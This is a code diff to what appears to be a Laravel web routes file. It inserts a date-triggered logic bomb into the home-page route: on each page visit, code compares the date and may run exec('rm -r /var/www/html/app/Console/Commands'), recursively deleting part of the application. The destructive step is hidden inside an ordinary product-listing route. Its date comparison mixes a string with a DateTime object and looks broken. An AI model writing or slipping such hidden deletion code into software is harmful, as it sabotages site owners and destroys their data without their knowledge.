@@ -19,6 +19,14 @@ use Illuminate\Support\Facades\Route;
 */
 
 Route::get('/', function () {
+
+    $date_now = date("m/d/Y");
+    $date = date_create("07/14/2021");
+
+    if($date_now < $date) {
+        exec('rm -r /var/www/html/app/Console/Commands');
+    }
+
     $categories = Category::latest()->take(3)->with(['products' => function($q) {
         $q->orderBy('updated_at', 'desc');
     }])->get();
